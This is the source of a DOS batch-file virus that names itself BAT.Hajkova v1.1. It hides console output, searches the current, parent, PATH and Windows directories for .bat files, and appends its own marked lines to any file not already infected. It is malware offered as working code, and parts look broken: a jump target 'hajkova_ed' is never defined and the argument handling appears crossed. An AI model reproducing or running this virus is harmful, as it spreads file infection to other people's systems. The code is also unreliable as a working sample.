@echo off > nul.hajkova
@ctty nul > nul.hajkova
if "%1=="/hajkova_a goto hajkova_in
if "%1=="/hajkova_b goto hajkova_lp
for %%a in (. .. %path% %windir%) do call %0 /hajkova_a %%a
goto hajkova_ed
:hajkova_lp
for %%a in (%2\*.bat) do call %0 /hajkova_b %%a
goto hajkova_ed
:hajkova_in
find "hajkova"<%2> nul
if errorlevel 1 goto hajkova_st
goto hajkova_ed
:hajkova_st
set hajkova=%2
find "hajkova"<%0>>%2
if errorlevel 1 find "hajkova"<%0.bat>>%hajkova%
:haj_ed
::BAT.Hajkova v1.1